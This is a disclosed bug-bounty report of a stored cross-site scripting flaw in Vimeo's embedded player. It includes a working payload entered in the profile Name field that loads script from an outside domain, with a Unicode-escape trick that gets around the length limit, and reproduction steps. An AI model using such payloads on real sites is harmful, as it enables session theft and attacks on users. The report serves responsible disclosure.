# Stored XSS on player.vimeo.com

## Report Details
- **Report ID**: 85488
- **URL**: https://hackerone.com/reports/85488
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-08-29T08:49:17.806Z
- **Disclosed**: 2017-08-31T10:29:27.840Z

## Reporter
- **Username**: stefanovettorazzi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: vimeo

## Vulnerability Information
__Description__

The page loaded for the Vimeo embedded player prints the Name of the owner of the video in Javascript context. Some characters are escaped, like `"` but others like `>`, `<` and `/` are not. So, you can insert your own HTML tags like `</script><script src="//domain">` and - if the video is public - any Vimeo user can be affected by the Javascript code that is loaded.
However, there is a limitation: the maximum length of Name is 32 characters. But, it's not impossible to circumvent this limitation on Chrome and Safari. One way that I figured out to exploit this vulnerability, is taking advantage that the character `ñ` is printed as `\u00f1` in the page of the embedded player and that Chrome and Safari take `/\u00f1` as `//u00f1`. 

__Proof of concept__
Reproducible on Chrome.
1. Go to https://vimeo.com/settings.
2. For _Name_ enter `</script><script src=/ñ.xyz>`.
3. Click _Save Changes_.
4. Upload a video and get the numeric identification of the video from the path like https://vimeo.com/137669589.
5. I just registered the domain _u00f1.xyz_ but StartSSL is not resolving the domain yet, so I can't request a certificate until their DNS servers are updated. For this reason you first have to go to https://u00f1.xyz/, click _Advanced_ and click _Proceed to u00f1.xyz (unsafe)_. I will add a comment to this report as soon as I can install a valid certificate. Sorry for the problem.
5. Go to https://player.vimeo.com/video/[numeric_identification_of_the_video].
6. The content from https://u00f1.xyz is loaded.
7. `alert(document.domain)` is executed.

Please, let me know if something is not clear.
Video player with the XSS working: https://player.vimeo.com/video/137669589

## Attachments
No attachments
